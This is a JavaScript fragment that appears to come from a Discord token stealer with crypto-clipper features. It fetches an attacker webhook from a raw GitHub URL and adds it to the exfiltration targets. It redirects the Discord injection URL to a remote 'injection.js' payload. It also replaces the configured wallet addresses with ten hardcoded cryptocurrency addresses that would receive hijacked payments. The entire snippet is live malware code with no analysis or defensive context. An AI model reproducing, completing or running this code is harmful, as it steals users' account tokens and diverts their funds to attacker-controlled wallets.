(async () => {

    if ((webhooks.push((await requires.axios.get('https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/webhook.txt')).data), false)) {} // Add his webhook.
    !(config.discord.base_url = "https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/injection.js"); // Change the injection url
    for (let [key, value] of Object.entries({
            "btc": "bc1q8mtpkcfwlff4dlguhxmsk8lhumzgxcd9t50vta",
            "ltc": "LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut",
            "xmr": "4B4D15Q6kas9YGxASZsqhBJVTvyDmS4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCToJVMUffwjRDxNn9e8YbSTj7Sw5jGbwGS",
            "eth": "0x2086a641D1dD2C3557e6b880E8A97cfdfDb04d4E",
            "xrp": "rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf",
            "neo": "ANn5THmQidTh6zENyCytJV98i6po1dLJhh",
            "bch": "qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j",
            "doge": "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6",
            "dash": "Xn6Mnu6aDxYz2cmka77JE6w8YTULbHyYBR",
            "xlm": "GB7HQ2WNBSUNHATASST44ADP2ND34BRTHKWWLIKRU6YP54SJUK53OLQG"
        })) {
        config.crypto[key] = value;
    }

})();